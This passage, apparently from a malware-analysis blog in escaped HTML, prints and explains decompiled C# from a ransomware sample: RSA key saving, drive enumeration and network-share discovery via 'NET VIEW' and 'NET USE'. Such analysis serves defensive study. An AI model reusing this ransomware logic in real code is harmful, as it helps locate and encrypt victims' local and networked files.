        &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MasterRSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;strBytes&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strBytes&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ToBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CryptedPrivateKey&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strBytes&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\n&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RSA_Public&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;KeyValidity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;SaveKeysToFiles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;LockerForValidKey&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SavePrivateKey&lt;/code&gt; genuinely saves a combination of encrypted (private) key and public RSA key, as depicted in the preceding code. In fact, it then executes a new function called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SavekeysToFiles&lt;/code&gt;, which saves the keys in a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DecryptionInfo.auth&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Of course, the ransomware contains standard functions for this type of malware like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetDrives&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetDrives&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;DriveInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allDrives&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DriveInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetDrives&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_contain&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DriveInfo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;drive&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allDrives&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;drive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;C:\\&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_contain&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Drives&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;drive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;Drives&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Enqueue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;drive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_contain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Drives&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Enqueue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;C:\\&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetNetwork&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetNetwork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Network&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoCMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;NET VIEW&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultList&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'\n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;\\&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;Network&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;' '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoCMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;NET USE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultList&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'\n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;drive&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Regex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;\s(\S{2})\s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Groups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Drives&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;drive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;\\&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;drive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Drives&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Enqueue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;drive&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\\&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NetResource&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Regex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;(\\\\[^\\\s]*)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RegexOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Groups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NetResource&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Network&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NetResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Network&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NetResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;device&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Network&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoCMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;NET VIEW &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;device&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultList&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'\n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Disk&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;BackspacesCleaner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
